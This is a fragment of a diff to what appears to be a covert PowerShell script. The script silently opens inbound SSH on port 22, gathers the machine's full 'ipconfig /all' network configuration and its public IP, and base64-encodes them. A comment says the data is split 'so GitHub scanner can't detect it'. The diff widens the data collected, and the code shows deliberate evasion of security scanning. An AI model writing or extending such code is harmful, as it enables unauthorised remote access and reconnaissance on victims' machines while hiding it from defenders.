@@ -29,10 +29,10 @@ try {
 New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
 Add-Content $log "Done"
 
-$privateIP = (ipconfig | Select-String "IPv4").ToString().Trim()
+$allConfig = ipconfig /all | Out-String
 $publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
 
-$content = "Private IP:`n$privateIP`n`nPublic IP: $publicIP"
+$content = "Public IP: $publicIP`n`n--- Full ipconfig /all ---`n$allConfig"
 $bytes = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
 
 # SPLIT so GitHub scanner can't detect it
